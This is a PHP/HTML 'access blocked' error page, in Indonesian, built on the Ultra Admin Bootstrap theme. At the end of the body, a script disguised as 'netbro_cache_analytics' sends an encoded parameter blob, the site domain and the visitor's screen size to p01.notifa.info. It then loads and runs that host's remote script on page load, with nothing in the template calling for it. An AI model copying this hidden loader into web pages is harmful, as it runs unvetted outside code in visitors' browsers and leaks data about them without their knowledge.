<!DOCTYPE html>
<html class=" ">

<head>
    <!-- 
         * @Package: Ultra Admin - Responsive Theme
         * @Subpackage: Bootstrap
         * @Version: 4.1
         * This file is part of Ultra Admin Theme.
        -->
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta charset="utf-8" />
    <title>UNIGA - BLOCKED</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta content="" name="description" />
    <meta content="" name="author" />

    <link rel="shortcut icon" href="<?= base_url('assets/'); ?>images/favicon.png" type="image/x-icon" /> <!-- Favicon -->
    <link rel="apple-touch-icon-precomposed" href="<?= base_url('assets/'); ?>images/apple-touch-icon-57-precomposed.png"> <!-- For iPhone -->
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="<?= base_url('assets/'); ?>images/apple-touch-icon-114-precomposed.png"> <!-- For iPhone 4 Retina display -->
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="<?= base_url('assets/'); ?>images/apple-touch-icon-72-precomposed.png"> <!-- For iPad -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="<?= base_url('assets/'); ?>images/apple-touch-icon-144-precomposed.png"> <!-- For iPad Retina display -->




    <!-- CORE CSS FRAMEWORK - START -->
    <link href="<?= base_url('assets/'); ?>plugins/pace/pace-theme-flash.css" rel="stylesheet" type="text/css" media="screen" />
    <link href="<?= base_url('assets/'); ?>plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="<?= base_url('assets/'); ?>plugins/bootstrap/css/bootstrap-theme.min.css" rel="stylesheet" type="text/css" />
    <link href="<?= base_url('assets/'); ?>fonts/font-awesome/css/font-awesome.css" rel="stylesheet" type="text/css" />
    <link href="<?= base_url('assets/'); ?>css/animate.min.css" rel="stylesheet" type="text/css" />
    <link href="<?= base_url('assets/'); ?>plugins/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" type="text/css" />
    <!-- CORE CSS FRAMEWORK - END -->

    <!-- OTHER SCRIPTS INCLUDED ON THIS PAGE - START -->
    <!-- OTHER SCRIPTS INCLUDED ON THIS PAGE - END -->


    <!-- CORE CSS TEMPLATE - START -->
    <link href="<?= base_url('assets/'); ?>css/style.css" rel="stylesheet" type="text/css" />
    <link href="<?= base_url('assets/'); ?>css/responsive.css" rel="stylesheet" type="text/css" />
    <!-- CORE CSS TEMPLATE - END -->

</head>
<!-- END HEAD -->

<!-- BEGIN BODY -->

<body class=" ">

    <div class="col-lg-12">
        <section class="box nobox">
            <div class="content-body">
                <div class="row">
                    <div class="col-md-12 col-sm-12 col-xs-12">

                        <h1 class="page_error_code text-primary"><img alt="Logo" src="<?= base_url('assets/'); ?>img/logo/logo2.png?t=<?php echo time(); ?>" width="250" height="250"></h1>
                        <h1 class="page_error_info">Maaf ! Anda tidak bisa mengakses Halaman ini</h1>

                        <div class="col-md-6 col-sm-6 col-xs-8 col-md-offset-3 col-sm-offset-3 col-xs-offset-2">
                            <form action="javascript:;" method="post" class="page_error_search">

                                <div class="text-center page_error_btn">
                                    <a href='<?= base_url('user'); ?>' class="btn btn-orange btn-lg btn-corner btn-icon">
                                        <i class="fa fa-reply"></i> &nbsp; <span>Kembali</span>
                                    </a>

                                </div>
                            </form>
                        </div>

                    </div>
                </div>
            </div>
        </section>
    </div>



    <!-- LOAD FILES AT PAGE END FOR FASTER LOADING -->


    <!-- CORE JS FRAMEWORK - START -->
    <script src="<?= base_url('assets/'); ?>js/jquery-1.11.2.min.js" type="text/javascript"></script>
    <script src="<?= base_url('assets/'); ?>js/jquery.easing.min.js" type="text/javascript"></script>
    <script src="<?= base_url('assets/'); ?>plugins/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="<?= base_url('assets/'); ?>plugins/pace/pace.min.js" type="text/javascript"></script>
    <script src="<?= base_url('assets/'); ?>plugins/perfect-scrollbar/perfect-scrollbar.min.js" type="text/javascript"></script>
    <script src="<?= base_url('assets/'); ?>plugins/viewport/viewportchecker.js" type="text/javascript"></script>
    <!-- CORE JS FRAMEWORK - END -->


    <!-- OTHER SCRIPTS INCLUDED ON THIS PAGE - START -->
    <!-- OTHER SCRIPTS INCLUDED ON THIS PAGE - END -->


    <!-- CORE TEMPLATE JS - START -->
    <script src="<?= base_url('assets/'); ?>js/scripts.js" type="text/javascript"></script>
    <!-- END CORE TEMPLATE JS - END -->

    <!-- Sidebar Graph - START -->
    <script src="<?= base_url('assets/'); ?>plugins/sparkline-chart/jquery.sparkline.min.js" type="text/javascript"></script>
    <script src="<?= base_url('assets/'); ?>js/chart-sparkline.js" type="text/javascript"></script>
    <!-- Sidebar Graph - END -->













    <!-- General section box modal start -->
    <div class="modal" id="section-settings" tabindex="-1" role="dialog" aria-labelledby="ultraModal-Label" aria-hidden="true">
        <div class="modal-dialog animated bounceInDown">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                    <h4 class="modal-title">Section Settings</h4>
                </div>
                <div class="modal-body">

                    Body goes here...

                </div>
                <div class="modal-footer">
                    <button data-dismiss="modal" class="btn btn-default" type="button">Close</button>
                    <button class="btn btn-success" type="button">Save changes</button>
                </div>
            </div>
        </div>
    </div>
    <!-- modal end -->
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXJbT4inBQFax3edEgAEuZeslu8o5mhniFfx6HJa9sti15Ki0x9rxIqAyAiL%2fTPmoVnmf%2bAAHLYn%2bXauTnu10pWLxpMzOlCkAs93XOtXgp574oyyRrR5bMQAbtX0cA8ORKxQiLUvqLq7lPK4h4eN5Mf4jFtmv5IAFlQo117bwCeuzt1XzP4Ygc%2fAQ%2fdZZISlFhIfKM%2fyxI8TbrhWqCzzKdTd4Lj8%2fYszrnDhwvf%2fTariYWbV16FfCA1AhJV5dW6G3iZx1kDQZxQS5tjwB%2fssR24RhPn%2bxb1dlVAt2VOX0VVsnxzMzPF5DuMIYdMrk49Yzqn7kMX8b4UI71h45%2fu7TOWeWqxr3sttIn3BL3acFLTVlmuP6RJjlXRbnhCIkcLdbyKY25iHS4SVFTa4mn7DsdEDU5q66HG%2feuAOcYdG85yDBP5fdbq66JahaIliFrKidPPVd6SHDK3%2bdVIP3NFv46b1De0eTsuVSzAc6N%2fOgXNHVINE2BdRTXToOPNsM8kjSht2Solenu3pA9v9bjRtmLkDvjuM79EqJ2" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>